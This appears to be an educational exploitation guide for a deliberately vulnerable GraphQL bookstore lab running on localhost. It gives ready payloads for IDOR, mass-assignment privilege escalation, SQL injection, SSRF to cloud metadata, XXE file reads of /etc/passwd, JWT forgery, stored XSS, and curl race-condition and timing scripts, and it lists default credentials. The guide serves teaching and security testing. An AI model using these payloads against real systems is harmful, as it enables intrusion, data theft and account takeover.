# GraphQL Bookstore API - Vulnerability Exploitation Guide

> **WARNING**: This API contains intentional security vulnerabilities for educational purposes. DO NOT use in production.

## Base URL
```
http://localhost:4000/graphql
```

---

# VULNERABILITIES

## 1. Broken Object Level Authorization (BOLA) - IDOR

**Description**: IDOR occurs when an application exposes direct references to internal objects (like database IDs) without proper authorization checks. Users can manipulate these references to access data belonging to other users.

**Impact**: Attackers can view, modify, or delete other users' private data.

### Exploit - Access Any User's Cart
```graphql
# Get any user's cart by knowing their user ID
query { cart(userId: "TARGET_USER_ID") { id items { title price } } }
```

### Exploit - View Any User's Orders
```graphql
# Get any user's orders
query { orders(userId: "TARGET_USER_ID") { id orderNumber totalAmount } }
```

### Exploit - Cancel Any Order
```graphql
mutation { cancelOrder(orderId: "TARGET_ORDER_ID") { success message } }
```

### Exploit - Delete Any Review
```graphql
mutation { deleteReview(reviewId: "TARGET_REVIEW_ID") { success message } }
```

### Exploit - Test Any Webhook
```graphql
mutation { testWebhook(webhookId: "TARGET_WEBHOOK_ID") { success message } }
```

---

## 2. Mass Assignment

**Description**: Mass assignment occurs when an application automatically maps client input to internal object properties without restricting which fields can be updated. Attackers can modify read-only fields like `role` or `isAdmin` to escalate privileges.

**Impact**: Privilege escalation from regular user to admin.

### Exploit - Escalate to Admin
```graphql
mutation { 
  updateProfile(
    role: "admin"
  ) { 
    id username role 
  } 
}
```

---

## 3. SQL Injection

**Description**: SQL injection occurs when user input is embedded directly in SQL queries without proper sanitization. Attackers can manipulate the query structure to execute arbitrary SQL commands, potentially extracting sensitive data, bypassing authentication, or modifying the database.

**Impact**: Complete database compromise, data exfiltration, authentication bypass.

### Exploit - Extract All Users
```graphql
query { _searchAdvanced(query: "' UNION SELECT id,username,password_hash,3,4,5,6,7,8 FROM users-- -") { id title } }
```

### Exploit - Bypass Authentication
```graphql
query { _searchAdvanced(query: "admin'--") { id title } }
```

### Exploit - Extract All Books
```graphql
query { _searchAdvanced(query: "%" OR 1=1) { id title price } }
```

---

## 4. SSRF (Server-Side Request Forgery)

**Description**: SSRF occurs when an application fetches remote resources based on user input without proper validation. Attackers can make the server connect to internal services, cloud metadata endpoints, or internal networks that should not be exposed.

**Impact**: Access to internal services, cloud metadata, pivoting to internal network.

### Exploit - Access Cloud Metadata
```graphql
query { _fetchExternalResource(url: "http://169.254.169.254/latest/meta-data/") }
```

### Exploit - Access Internal Services
```graphql
query { _fetchExternalResource(url: "http://localhost:5432/") }
query { _fetchExternalResource(url: "http://127.0.0.1:8080/admin") }
```

### Exploit - Port Scanning
```graphql
query { _fetchExternalResource(url: "http://localhost:22/") }
query { _fetchExternalResource(url: "http://localhost:3306/") }
```

---

## 5. Missing Function Level Authorization

**Description**: This vulnerability occurs when sensitive endpoints are accessible without authentication or proper authorization checks. Admin-only functionality should verify the user's role before allowing access.

**Impact**: Complete administrative compromise, access to all user data.

### Exploit - Get Admin Stats
```graphql
query { _adminStats { userCount bookCount totalRevenue } }
```

### Exploit - Get All Orders
```graphql
query { _adminAllOrders { id orderNumber userId totalAmount } }
```

### Exploit - Get All Payments
```graphql
query { _adminAllPayments { id userId amount cardNumber status } }
```

### Exploit - Internal User Search (Leaks Passwords)
```graphql
query { _internalUserSearch(username: "admin") { id username passwordHash role } }
```

---

## 6. GraphQL Batch Query Bypass

**Description**: GraphQL's batching feature allows multiple queries in a single request. While rate limiters typically block individual requests, batch queries can bypass these protections since they count as a single request. Attackers can overwhelm the server or bypass security checks.

**Impact**: Bypassing rate limits, DoS attacks, circumventing security controls.

### Exploit - Bypass Rate Limiting
```graphql
query { _batchQuery(queries: "[{\"query\": \"{ books { id } }\"}, {\"query\": \"{ books { id } }\"}]") }
```

### Exploit - DoS via Batch
Send thousands of queries in a single batch to overwhelm the server.

---

## 7. XXE (XML External Entity)

**Description**: XXE occurs when XML parsers process external entity references without disabling them. Attackers can embed malicious XML that references external resources, allowing file disclosure, SSRF attacks, or denial of service.

**Impact**: File system access, SSRF, service disruption.

### Exploit - Read Local Files
```graphql
query { processXMLData(xml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>") }
```

### Exploit - Read Source Code
```graphql
query { processXMLData(xml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///src/main.cpp\">]><data>&xxe;</data>") }
```

### Exploit - SSRF via XXE
```graphql
query { processXMLData(xml: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/\">]><data>&xxe;</data>") }
```

---

## 8. JWT Algorithm Confusion

**Description**: JWT algorithm confusion occurs when the server accepts tokens with algorithms it shouldn't trust (like "none") or when an attacker can switch from asymmetric (RS256) to symmetric (HS256) algorithms using the public key as the HMAC secret. This allows forging tokens.

**Impact**: Complete authentication bypass, privilege escalation.

### Exploit - Algorithm Confusion
```graphql
query { decodeJWT(token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.foobar") }
```

Craft a token with algorithm set to "none" or use HS256 with a known key.

---

## 9. Cache Poisoning

**Description**: Cache poisoning involves manipulating cache entries to serve malicious content to other users. Attackers can set arbitrary cache values that get served to subsequent users, potentially injecting malicious JavaScript (XSS) or redirecting users.

**Impact**: XSS attacks, phishing, serving malicious content to users.

### Exploit - Poison Cache
```graphql
query { manageCache(action: "set", key: "user_1", value: "admin") }
```

### Exploit - Retrieve Cached Data
```graphql
query { manageCache(action: "get", key: "user_1") }
```

---

## 10. Denial of Service (DoS) - Deep Recursion

**Description**: GraphQL allows nested queries that can create deeply recursive structures. Without depth limiting, attackers can craft queries that consume excessive CPU, memory, or database resources, causing the service to become unavailable.

**Impact**: Service unavailability for all users.

### Exploit - Resource Exhaustion
```graphql
query { handleRecursiveQuery(depth: 1000) { id nested { id nested { id nested { id } } } } }
```

---

## 11. Race Condition (Coupon Application)

**Description**: Race conditions occur when the application behavior depends on timing of concurrent operations. In coupon application, multiple simultaneous requests can bypass validation checks, allowing coupons to be applied multiple times or discounts to be stacked illegally.

**Impact**: Financial loss through repeated discount abuse.

### Exploit - Apply Coupon Multiple Times
```bash
# Send multiple concurrent requests
curl -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { applyCoupon(code: \"WELCOME10\") { success discountAmount } }"}' &

# Repeat multiple times simultaneously
```

---

## 12. Timing Attack (Login Enumeration)

**Description**: Timing attacks measure the time it takes for operations to complete to infer information. In login, the time difference between "invalid username" vs "invalid password" reveals whether a username exists. Attackers can enumerate valid usernames.

**Impact**: User enumeration, enabling further attacks like credential stuffing.

### Exploit - User Enumeration
```bash
# Time response for existing user (slower - more computation)
time curl -s -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { login(username: \"admin\", password: \"wrongpass\") { success } }"}'

# Time response for non-existing user (faster - less computation)
time curl -s -X POST http://localhost:4000/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { login(username: \"nonexistent\", password: \"wrongpass\") { success } }"}'
```

---

## 13. Second-Order SQL Injection / XSS

**Description**: Second-order attacks involve storing malicious payload in the database that gets executed later when retrieved by another part of the application. Data is saved safely initially but becomes dangerous when displayed or used in subsequent operations.

**Impact**: Stored XSS, injection in contexts where input is re-used.

### Exploit - Inject via Review
```graphql
mutation { 
  createReview(
    bookId: 1, 
    rating: 5, 
    comment: "<script>alert('XSS')</script>"
  ) { 
    success 
  } 
}
```

---

## 14. Information Disclosure via Introspection

**Description**: GraphQL introspection reveals the complete API schema, including all types, fields, queries, and mutations. While useful for legitimate users, it also helps attackers discover hidden endpoints and understand the full attack surface.

**Impact**: Attack surface enumeration, discovery of hidden functionality.

### Exploit - Get Full Schema
```graphql
query { __schema { types { name fields { name } } } }
```

---

# HIDDEN ENDPOINTS

## Pro Inventory (Hidden Books)

**Description**: The API contains hidden functionality that reveals additional content not shown in the regular book listing. This demonstrates how attackers can discover unreferenced endpoints.

Access 6 hidden expert-level security books:

```graphql
query { _proInventory }
```

---

## Hidden API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/webhooks/subscribe` | POST | Subscribe to webhook events |
| `/api/batch` | POST | Batch GraphQL queries |
| `/api/coupons/apply` | POST | Apply coupon codes |
| `/api/debug/timing` | GET | Debug timing information |

---

# DEFAULT CREDENTIALS

| Username | Password | Role |
|----------|----------|-------|
| admin    | password123 | admin |
| staff    | password123 | staff |
| user     | password123 | user |

---

# PAYMENT WARNING

The checkout and purchaseCart mutations will return a warning:
```
"warning": "Do not use real card details - this is a test environment"
```

This API should ONLY be used for testing/learning purposes.
